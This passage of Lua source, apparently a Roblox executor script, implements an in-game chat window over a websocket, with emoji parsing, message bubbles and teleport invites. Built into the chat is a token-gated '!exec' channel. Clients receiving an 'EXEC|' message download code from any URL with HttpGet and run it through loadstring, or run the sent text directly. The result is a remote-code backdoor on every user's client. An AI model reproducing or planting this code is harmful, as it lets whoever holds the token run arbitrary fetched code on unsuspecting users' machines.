local function parseEmojis(text)
    for k,v in pairs(emojis) do
        text = text:gsub(k,v)
    end
    return text
end

local function makeTextBubble(text, you)
    text = parseEmojis(text)

    local container = Instance.new("Frame")
    container.BackgroundTransparency = 1
    container.Size = UDim2.new(1,0,0,0)
    container.Parent = chat

    local bubble = Instance.new("Frame")
    bubble.BackgroundColor3 = you and Color3.fromRGB(0,120,220) or Color3.fromRGB(38,38,46)
    bubble.BorderSizePixel = 0
    bubble.Parent = container
    Instance.new("UICorner", bubble).CornerRadius = UDim.new(0,14)

    local lbl = Instance.new("TextLabel", bubble)
    lbl.BackgroundTransparency = 1
    lbl.TextWrapped = true
    lbl.Font = Enum.Font.Gotham
    lbl.TextSize = 14
    lbl.TextColor3 = Color3.fromRGB(255,255,255)
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.TextYAlignment = Enum.TextYAlignment.Top
    lbl.Text = text
    lbl.Position = UDim2.new(0,8,0,6)
    lbl.Size = UDim2.new(1,-16,0,0)
    lbl.AutomaticSize = Enum.AutomaticSize.Y

    local bubbleHeight = math.max(36, lbl.TextBounds.Y + 20)
    bubble.Size = UDim2.new(0.9,0,0,bubbleHeight)
    container.Size = UDim2.new(1,0,0,bubbleHeight)

    bubble.Position = you and UDim2.new(0.1,0,0,0) or UDim2.new(0,0,0,0)

    task.defer(scroll)
end

local function safeExec(payload)
    if type(loadstring) ~= "function" then return end
    local code = payload
    if payload:match("^https?://") then
        local ok,res = pcall(function()
            return game:HttpGet(payload)
        end)
        if ok and type(res)=="string" then
            code = res
        else
            return
        end
    end
    local fn = loadstring(code)
    if type(fn)=="function" then
        pcall(fn)
    end
end

-- sendText مع !exec, !invite, !join
local function sendText(text)
    if text:sub(1,5) == "!exec" then
        ws:Send("EXEC|" .. ADMIN_TOKEN .. "|" .. text:sub(7))
        return
    end

    if text:sub(1,7) == "!invite" then
        local target = text:match("^!invite%s+(%S+)")
        if target then
            ws:Send("INVITE|" .. target .. "|" .. game.PlaceId .. "|" .. game.JobId)
        end
        return
    end

    if text:sub(1,5) == "!join" then
        local target = text:match("^!join%s+(%S+)")
        if target then
            ws:Send("JOIN_REQUEST|" .. target .. "|" .. player.Name)
        end
        return
    end

    makeTextBubble("You: "..text, true)
    ws:Send(player.Name .. "|" .. text)
end

btn.MouseButton1Click:Connect(function()
    if box.Text ~= "" then
        sendText(box.Text)
        box.Text = ""
    end
end)

box.FocusLost:Connect(function(enter)
    if enter and box.Text ~= "" then
        sendText(box.Text)
        box.Text = ""
    end
end)

ws.OnMessage:Connect(function(msg)
    if msg:sub(1,5) == "EXEC|" then
        local _,_,token,payload = msg:find("^EXEC|(.-)|(.+)$")
        if token ~= ADMIN_TOKEN then return end
        safeExec(payload)
        return
    end

    if msg:sub(1,7) == "INVITE|" then
        local target, placeId, jobId = msg:match("^INVITE|(.-)|(.+)|(.+)$")
        if target == player.Name then
            TeleportService:TeleportToPlaceInstance(
                tonumber(placeId),
                jobId,
                player
            )
        end
        return
    end

    if msg:sub(1,13) == "JOIN_REQUEST|" then
        local target, requester = msg:match("^JOIN_REQUEST|(.-)|(.+)$")
        if target == player.Name then
            ws:Send("INVITE|" .. requester .. "|" .. game.PlaceId .. "|" .. game.JobId)
        end
        return
    end

    local n,t = msg:match("^(.-)|(.+)$")
    if n and t then
        makeTextBubble(n..": "..t, false)
        if not onlineUsers[n] then
            local label = Instance.new("TextLabel", onlineList)
            label.Text = n
            label.Font = Enum.Font.Gotham
            label.TextSize = 13
            label.TextColor3 = Color3.fromRGB(235,235,240)
            label.BackgroundTransparency = 1
            label.Size = UDim2.new(1,0,0,18)
            onlineUsers[n] = label
            updateOnlineUsers()
        end
    end
end)

